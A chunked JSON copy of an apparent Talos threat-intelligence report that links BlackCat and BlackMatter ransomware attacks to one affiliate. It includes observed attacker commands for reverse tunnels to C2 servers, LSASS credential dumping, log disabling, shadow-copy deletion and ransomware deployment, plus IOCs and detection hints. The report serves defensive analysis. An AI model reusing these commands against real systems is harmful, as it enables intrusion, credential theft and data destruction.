[
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x5ef24a5e",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "text": ""
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0xc20cbeb7",
            "title": "BlackCat/BlackMatter connection",
            "text": "While researching a BlackCat ransomware attack from December 2021, we observed a domain (and respective IP addresses) used to maintain persistent access to the network. This domain had also been used in a BlackMatter attack in September 2021. Further analysis revealed more commonalities, such as tools, file names and techniques that were common to both ransomware variants.\nAffiliates are responsible for compromising systems and deploying ransomware, so it is likely that attacks carried out by the same ransomware family may differ in techniques and procedures. On the other hand, RaaS operators are known to make training materials and general techniques and tools available to their affiliates, like the leaked Conti ransomware playbook covered by Talos in a previous\nblog\n. This may suggest there are some similarities across affiliates. \nOne difference we would expect to see across RaaS affiliates is the command and control (C2) infrastructure used for certain attacks. However, the overlapping C2 address found used in the BlackMatter and BlackCat attacks lead us to assess with moderate confidence that the same affiliate was responsible for both attacks.\nThis connection suggests that a BlackMatter affiliate was likely an early adopter possibly in the first month of operation of BlackCat. This is further evidence to support the rumors that there are strong ties between BlackMatter and BlackCat."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x8d41062b",
            "title": "Attack details",
            "text": "We analyzed the actions taken by what we believe to be the same affiliate/attackers in the December BlackCat attack and a September BlackMatter attack. In terms of attack flow, the attacks were similar to other human-operated ransomware attacks: initial compromise, followed by an exploration and data exfiltration phase, then attack preparation and finally, the attack execution.\nThe following table summarizes the commonalities and differences in the MITRE ATT&CK framework between both attacks:"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x3f01d0b5",
            "title": "Initial access",
            "text": "We could not identify the initial compromise vector for the BlackCat attack. It is likely that the attack happened on a system not monitored by Cisco Talos telemetry or that a previously compromised account was used to log into an exposed system.\nThere was evidence in the BlackMatter attack that the actor established initial access via the possible exploitation of Microsoft Exchange vulnerabilities. However, we could not directly tie attempts of exploiting vulnerabilities in Microsoft Exchange to the attack and, for this reason, we assess with low confidence that the attack may have started with the exploitation of a vulnerability in Exchange."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0xb1077276",
            "title": "Persistence",
            "text": "Beyond the access provided by the first exploitation vector, the attackers made sure they had additional remote access to several internal systems. \nDuring the BlackCat attack, the actors used a tool called\nreverse-ssh\n, compiled with the C2 server address embedded, to set up reverse SSH tunnels and provide reverse shells to the attacker. Reverse-ssh was deployed to C:\\ directory and named: system, Windows or cache task.\nIt was also observed hidden by writing to an alternate data stream (ADS) of the C:\\ directory using the following command:\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -command & {(get-content c:\\system -raw | set-content c:\\ -stream 'cachetask')}c:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn microsoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f\nc:\\windows\\system32\\schtasks.exe /run /tn microsoft\\windows\\wininet\\cachetask\nThe image file execution option debugger registry key was another way to ensure the malicious file would be persistently executed on the system:\nc:\\windows\\system32\\reg.exe add hklm\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\taskmgr.exe /v debugger /t reg_sz /d c:\\system\nDuring the BlackMatter attack, the group used a similar technique but with a different tool: GO Simple Tunnel (GOST). G\nOST\nis a Go-based tunneling tool that was used to establish a reverse SSH tunnel to an attacker-controlled C2 server. This C2 server is the same that was used in the BlackCat attack. The name used for the deployed Gost file was \"system.exe\", similar to the file name used in the BlackCat attack for reverse-ssh.\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l rtcp://0.0.0.0:1116/127.0.0.1:3388 -f mwss://52[.]149[.]228[.]45:443 /st 12:00 /f\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l rtcp://0.0.0.0:1117/127.0.0.1:3388 -f mwss://20[.]46[.]245[.]56:443 /st 12:00 /f\nThe same C2 domain was used in both attacks:"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x6ffe7f2d",
            "title": "Defense evasion",
            "text": "During the BlackCat attack, logs were disabled on several systems to avoid detection. For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below).\nc:\\windows\\system32\\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false\nThe anti-rootkit tool\nGmer\nwas loaded into a small number of key systems. We believe the attackers used this to disable endpoint protection.\nc:\\users\\<username>\\downloads\\gmer\\gmer.exe"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x20723f3",
            "title": "Credential access",
            "text": "Local and domain user credentials were collected, on a few key systems, by dumping the LSASS process memory and extracting credentials with Microsoft Sysinternals\nProcdump\nand\nDumpert\n:\nc:\\windows\\system\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\nc:\\windows\\system\\dumpert.exe lsass.exe\nDuring the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS memory:\npowershell rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump (get-process lsass).id c:\\temp\\lsass.dmp full\nBeyond the Windows login credentials, during the BlackCat attack, the attackers used a tool named \"steal.exe\" to harvest additional data. We could not obtain the binary, but based on the creation of a results folder with an \"archive.zip\" file inside it, we believe the tool may be\nHackBrowserData\n, or a version of it.\nThe following commands were used on a few systems:\ncmd.exe /q /c steal.exe 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1\ncmd.exe /q /c cd results 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1\ncmd.exe /q /c dir 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 \ncmd.exe /q /c del archive.zip 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1\ncmd.exe /q /c del c:\\steal.exe 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0xd3119d27",
            "title": "Discovery",
            "text": "During the BlackCat attack, we observed network scanning and reconnaissance using\nso\nftperfect n\network scanner\n. This tool has many features beyond simple network scanning and was probably a valuable tool in understanding systems roles and network infrastructure and possible lateral movement. The following commands show this tool in use. Notice that the name of the executable has been changed to make it blend into the system's regular processes."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x13f47dcb",
            "title": "cmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 cmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255",
            "text": "ADRecon was also used to collect information from Active Directory and its key servers.\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\adrecon.ps1\nDuring the BlackMatter attack, the attackers also searched for additional ways to maintain access. For example, the following command shows the attackers exploring an existing TeamViewer installation:\ncmd.exe /q /c teamviewer.exe --getid\ncmd.exe /q /c dir c:\"program files \ncmd.exe /q /c dir c:\"program files (x86) 1\ncmd.exe /q /c dir c:\"program files (x86)\\teamviewer\\\ncmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe --getid\ncmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe -info\nThe following commands show the attackers exploring the keepass password manager config:\ncmd.exe /q /c dir c:\"program files (x86)\\\ncmd.exe /q /c dir c:\"program files (x86)\"keepass password safe 2\\\ncmd.exe /q /c type c:\"program files (x86)\"keepass password safe 2\\keepass.exe.config"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0xfbd01569",
            "title": "Lateral movement",
            "text": "We observed lateral movement using three main tools and techniques, including\nImpacket\n's wmiexec, PowerShell using WinRM service and Microsoft Remote Desktop.\nImpacket\n's WMIExec provides a shell on remote systems that have the WMI service exposed. We observed its use in both the BlackCat and BlackMatter attacks. This tool's activity can be detected by detecting processes created by wmipsrv.exe that terminate with the following string:\n1> \\\\127.0.0.1\\admin$\\__<timestamp>.<6 digits> 2>&1\nThis tool was often used to issue a command to allow WinRM service network connections through the firewall, possibly for the convenience of using some prepared scripts:\ncmd.exe /q /c netsh advfirewall firewall add rule name=service dir=in protocol=tcp localport=5985 action=permit 1> \\\\127.0.0.1\\c$\\windows\\temp\\qaiumg 2>&1\nWinRM allows attackers to use PowerShell to execute commands on remote machines. This tool can be detected by searching for processes started by \"wsmprovhost.exe\". Below, there's a few examples of WinRM being used for lateral movement, in this case, to disable logging of many Windows services:\nc:\\windows\\system32\\wevtutil.exe set-log active directory web services /enabled:false\nc:\\windows\\system32\\wevtutil.exe set-log application /enabled:false\nc:\\windows\\system32\\wevtutil.exe set-log hardwareevents /enabled:false\nc:\\windows\\system32\\wevtutil.exe set-log internet explorer /enabled:false\nMicrosoft Remote Desktop was also used by the attackers to obtain GUI access to systems. The following impacket command was issued before the adversary could gain remote admin access.\ncmd.exe /q /c reg add hkey_local_machine\\system\\currentcontrolset\\control\\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> \\\\127.0.0.1\\admin\\$\\__<timestamp>\\.<num> 2>&1\nOther lateral movement techniques observed include PsEexec on both attacks and RemCom an open-source version of psexec during the BlackMatter attack."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x89be30a3",
            "title": "Command and control",
            "text": "Interestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload and download command, they revealed the use of Kali Linux to execute remote commands.\ncmd.exe /q /c #upload c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1> \\\\127.0.0.1\\admin$\\<num>.<num> 2>&1\ncmd.exe /q /c #download c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1> \\\\127.0.0.1\\admin$\\<num>.<num> 2>&1\nIt is unlikely that the attackers had a Kali Linux installation inside the victim's network, so remote control of the systems was likely achieved through the SSH tunnels described earlier."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0xdd46ae98",
            "title": "Exfiltration",
            "text": "Although we observed a suspiciously large number of documents opened and screenshots taken from one of the compromised systems, we did not identify techniques used to exfiltrate data from the network. It is possible that document exfiltration is carried out by the execution of upload/download commands similar to the ones listed above."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x4dfa78f2",
            "title": "Impact",
            "text": "In both attacks, before the actual execution of the ransomware, the attackers performed several actions preparing systems to make the execution as successful as possible. On the day of the attack, the attacker logged in to the domain controller and opened the group policy management interface. The attackers then dropped and executed a file named \"apply.ps1.\" We believe this script created and prepared the group policy to cause the execution of the ransomware throughout the domain.\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\apply.ps1\nThis execution results in the immediate writing of group policy files to disk and is followed by the execution of the following command to force the deployment of the group policy:\ncmd.exe /q /c gpupdate /force\nA few minutes before BlackCat ransomware started encrypting files, the attackers executed a script called \"defender.vbs\":\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\defender.vbs\nIn the BlackMatter attack, the exact same file was named \"def.vbs\" and executed minutes before the encryption began:\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\def.vbs\nWe believe this is part of the attack, but at this time do not know the exact role of this script. \nWhen encryption begins, the ransomware file named <num>.exe in the BlackCat attack and, similarly, <num>.exe in the BlackMatter attack, was dropped on the domain servers inside the SYSVOL folder, making it accessible on the NETLOGON network share, accessible by all users in the domain. File encryption makes all systems execute these files from the remote share.\nBlackCat attack:\ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe --access-token <token>\nBlackMatter attack:\ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe\nThe following variations of the BlackCat command were observed:\n<num>.exe --access-token <token> /f\n<num>.exe --access-token <token> --no-prop-servers \\\\<hostname> --propagated\n<num>.exe -access-token <token> -v -p \\\\<hostname>\\scans\n<num>.exe --access-token <token>\n<num>.exe --child --access-token <token>\n<num>.exe -access-token <token> -v -p .\nThe BlackCat executable deployed other commands to make its execution more effective:\nc:\\windows\\system32\\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1\nc:\\windows\\system32\\cmd.exe /c reg add hkey_local_machine\\system\\currentcontrolset\\services\\lanmanserver\\parameters /v maxmpxct /d 65535 /t reg_dword /f\nc:\\windows\\system32\\cmd.exe /c fsutil behavior set symlinkevaluation r2r:1\nc:\\windows\\system32\\cmd.exe /c vssadmin.exe delete shadows /all /quiet\nc:\\windows\\system32\\cmd.exe /c wmic.exe shadowcopy delete\nc:\\windows\\system32\\cmd.exe /c arp -a\nc:\\windows\\system32\\cmd.exe /c bcdedit /set {default}\nc:\\windows\\system32\\cmd.exe /c cmd.exe /c for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"\nc:\\windows\\system32\\cmd.exe /c bcdedit /set {default} recoveryenabled no"
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x4d5a4ca8",
            "title": "Conclusion",
            "text": "BlackCat first surfaced in November 2021, with the attack we described here taking place in December 2021. While we don't know how related BlackCat is to BlackMatter, we assess with moderate confidence that based on the tools and techniques of these attacks and overlapping infrastructure, BlackMatter affiliates were likely among the early adopters of BlackCat. \nAs we have seen several times before, RaaS services come and go. Their affiliates, however, are likely to simply move on to a new service. And with them, many of the TTPs are likely to persist.\nOne key aspect of these attacks is that adversaries take time exploring the environment and preparing it for a successful and broad attack before launching the ransomware, at which point every second means lost data. Therefore, it is key that the attack is detected in its early stages. \nThe two attacks described here took over 15 days to reach the encryption stage. Knowing the attackers tools and techniques and having monitoring and response processes in place could have prevented the successful encryption of the companies files.\nTalos will continue to monitor RaaS and their affiliates activities and provide intelligence, detection rules and indicators to help defenders as they work to protect their networks."
        }
    },
    {
        "report": {
            "id": "report_0x532e51b2",
            "date": "20220321",
            "title": "From BlackMatter to BlackCat: Analyzing two attacks from one affiliate",
            "url": "http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"
        },
        "chapter": {
            "id": "chapter_0x9b6d4c7b",
            "title": "IOCs",
            "text": "windows[.]menu\n52.149.228[.]45\n20.46.245[.]56\nApply.ps1 \nD97088F9795F278BB6B732D57F42CBD725A6139AFE13E31AE832A5C947099676\ndefender.vbs\nB54DD21019AD75047CE74FE0A0E608F56769933556AED22D25F4F8B01EE0DA15\nReverse-ssh (compiled with hardcoded domain):\n47AFFAED55D85E1EBE29CF6784DA7E9CDBD86020DF8B2E9162A0B1A67F092DCD\nstealer:\n65DBAFE9963CB15CE3406DE50E007408DE7D12C98668DE5DA10386693AA6CD73\nBlackcat ransomware:\n060CA3F63F38B7804420729CDE3FC30D126C2A0FFC0104B8E698F78EDAB96767\nBlackMatter ransomware:\n706F3EEC328E91FF7F66C8F0A2FB9B556325C153A329A2062DC85879C540839D"
        }
    }
]